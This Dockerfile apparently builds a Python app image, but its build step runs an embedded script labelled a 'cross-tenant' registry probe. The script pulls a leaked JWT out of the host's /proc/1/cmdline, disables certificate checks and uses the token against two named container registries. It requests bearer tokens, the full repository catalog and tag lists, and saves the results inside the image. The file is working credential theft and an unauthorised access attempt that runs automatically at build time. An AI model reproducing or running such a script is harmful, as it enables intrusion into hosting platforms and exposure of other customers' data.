FROM python:3.12-alpine
WORKDIR /app
RUN { echo "=== v12: REGISTRY cross-tenant ==="; \
python3 - <<'PY'
import re,urllib.request as u,urllib.error,ssl,json,base64
ctx=ssl._create_unverified_context()
cmd=open('/proc/1/cmdline','rb').read().decode('utf-8','replace')
m=re.search(r'eyJ[A-Za-z0-9_.-]{100,}',cmd); tok=m.group(0) if m else ''
print('jwt_len',len(tok))
# the leaked cred: username jwt/nomad-token, password = JWT
basic=base64.b64encode(('jwt/nomad-token:'+tok).encode()).decode()
def get(url,hdr=None):
    r=u.Request(url,headers=hdr or {})
    try:
        x=u.urlopen(r,context=ctx,timeout=10); return x.status,dict(x.headers),x.read(3000)
    except urllib.error.HTTPError as e: return e.code,dict(e.headers),e.read(500)
    except Exception as e: return -1,{},str(e).encode()
for reg in ['user-registry.amer-1.aivencloud.net','docker-mirror.amer-1.aivencloud.net']:
    print('=====',reg)
    st,h,b=get('https://%s/v2/'%reg,{'Authorization':'Basic '+basic})
    print(' basic /v2/ ->',st,b[:120])
    print(' WWW-Auth:',h.get('Www-Authenticate'))
    # try bearer token endpoint if challenged
    wa=h.get('Www-Authenticate','')
    mm=re.search(r'realm="([^"]+)"',wa); realm=mm.group(1) if mm else None
    ms=re.search(r'service="([^"]+)"',wa); svc=ms.group(1) if ms else reg
    if realm:
        for scope in ['registry:catalog:*','']:
            url=realm+'?service=%s'%svc+(('&scope='+urllib.parse.quote(scope)) if scope else '')
            st2,h2,b2=get(url,{'Authorization':'Basic '+basic})
            print('  token(%s) ->'%scope,st2,b2[:150])
            try:
                t=json.loads(b2).get('token') or json.loads(b2).get('access_token')
            except Exception: t=None
            if t:
                st3,h3,b3=get('https://%s/v2/_catalog'%reg,{'Authorization':'Bearer '+t})
                print('   CATALOG ->',st3,b3[:600])
                # try to list tags of our own repo + a guessed foreign repo
                st4,h4,b4=get('https://%s/v2/%s/tags/list'%(reg,'01a14add-9efc-713b-9674-db615a04c7d4'),{'Authorization':'Bearer '+t})
                print('   OUR TAGS ->',st4,b4[:300])
                break
PY
} > /app/v12.txt 2>&1
COPY app.py /app/app.py
ENV PORT=3000
EXPOSE 3000
CMD ["python3", "/app/app.py"]
